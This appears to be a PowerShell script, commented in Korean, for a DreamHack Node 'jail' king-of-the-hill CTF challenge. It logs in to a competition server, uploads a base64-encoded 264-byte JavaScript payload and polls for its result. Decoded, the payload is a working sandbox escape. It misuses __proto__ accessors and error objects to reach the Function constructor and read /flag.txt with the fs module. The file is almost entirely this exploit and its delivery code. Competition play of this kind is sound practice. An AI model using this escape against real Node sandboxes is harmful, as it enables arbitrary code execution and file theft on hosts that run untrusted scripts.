$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# nodejail KotH - 264B(payload-modern.js, getBuiltinModule) 차등 테스트
#   ready  best=264  -> 서버 node 가 getBuiltinModule 지원 => 264B 채택 가능
#   rejected (error before output) -> 미지원 => 266B(payload.js) 가 바닥
# 실패해도 활성(랭킹) 제출은 그대로라 안전.

$Base  = $env:KOTH_BASE;  if (-not $Base)  { $Base  = 'http://204.48.30.25:9000' }
$Token = $env:KOTH_TOKEN; if (-not $Token) { $Token = Read-Host 'DreamHack 토큰 입력' }
if (-not $Token) { Write-Host '토큰이 없습니다.'; exit 1 }

# 264B 페이로드 (base64 내장 - 따옴표 이슈 회피)
$b64 = 'Yz1CdWZmZXIuY2FsbDtDPWMuYmluZChjKTtwPSJfX3Byb3RvX18iO1c9V2ViQXNzZW1ibHkuY29tcGlsZVN0cmVhbWluZztXKCkuY2F0Y2goZT0+e0MoQyhjLl9fbG9va3VwU2V0dGVyX18sYyxwKSxDKEMoYy5fX2xvb2t1cEdldHRlcl9fLGMscCksZSksbnVsbCk7VygpLmNhdGNoKGU9PmUudG9TdHJpbmcuY29uc3RydWN0b3JgY29uc29sZS5sb2cocHJvY2Vzcy5nZXRCdWlsdGluTW9kdWxlKCdmcycpLnJlYWRGaWxlU3luYygnL2ZsYWcudHh0JykrJycpYCgpKX0p'
$payload = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64))

function Get-Text($resp) {
    try   { return [Text.Encoding]::UTF8.GetString($resp.RawContentStream.ToArray()) }
    catch { return $resp.Content }
}

Write-Host ('서버: ' + $Base)
Write-Host '로그인 중...'
try {
    $null = Invoke-WebRequest -Uri ($Base + '/login') -Method Post `
        -Body (@{ token = $Token } | ConvertTo-Json) -ContentType 'application/json' `
        -SessionVariable sess -UseBasicParsing -TimeoutSec 30
    Write-Host '로그인 OK'
} catch { Write-Host ('로그인/연결 실패: ' + $_.Exception.Message); exit 2 }

$bnd  = '----b' + [guid]::NewGuid().ToString('N')
$LF   = "`r`n"
$body = '--' + $bnd + $LF +
        'Content-Disposition: form-data; name="file"; filename="payload.js"' + $LF +
        'Content-Type: text/javascript' + $LF + $LF +
        $payload + $LF +
        '--' + $bnd + '--' + $LF

Write-Host ('264B 페이로드 제출 중... (' + $payload.Length + ' bytes)')
$watchId = $null
try {
    $sub  = Invoke-WebRequest -Uri ($Base + '/submit') -Method Post -Body $body `
        -ContentType ('multipart/form-data; boundary=' + $bnd) -WebSession $sess -UseBasicParsing -TimeoutSec 60
    $stxt = Get-Text $sub
    Write-Host ('SUBMIT ' + $sub.StatusCode + ' ' + $stxt)
    try { $watchId = ($stxt | ConvertFrom-Json).submission_id } catch {}
} catch {
    Write-Host ('SUBMIT 실패: ' + $_.Exception.Message); exit 3
}

Write-Host ''
$deadline = (Get-Date).AddSeconds(150)
while ($true) {
    $me  = Invoke-WebRequest -Uri ($Base + '/me/submissions') -WebSession $sess -UseBasicParsing -TimeoutSec 30
    $j   = (Get-Text $me) | ConvertFrom-Json
    $t   = $j.submissions | Where-Object { $_.id -eq $watchId }
    if ($t) { Write-Host ('#' + $watchId + ' status=' + $t.status) }
    if ($t -and $t.status -ne 'queued' -and $t.status -ne 'running') {
        Write-Host ''
        if ($t.status -eq 'ready' -and $t.best -ne $null) {
            Write-Host ('>>> 성공: ready, best=' + $t.best)
            Write-Host '>>> 서버 node 가 getBuiltinModule 지원 => 264B 사용 가능!'
        } else {
            Write-Host ('>>> 거부: ' + $t.status + '  reason=' + $t.reason)
            if ($t.reason -match 'error before') {
                Write-Host '>>> getBuiltinModule 미지원 => 266B(payload.js) 가 바닥. 활성 제출(#7,266)은 그대로 안전.'
            } else {
                Write-Host '>>> (예상외 사유 — reason 확인)'
            }
        }
        Write-Host ('현재 활성(랭킹) 제출: #' + $j.active)
        break
    }
    if ((Get-Date) -gt $deadline) { Write-Host '(시간초과 — koth.bat 으로 나중에 상태 확인)'; break }
    Write-Host '... 채점 대기, 5초 후 재조회 ...'
    Start-Sleep -Seconds 5
}
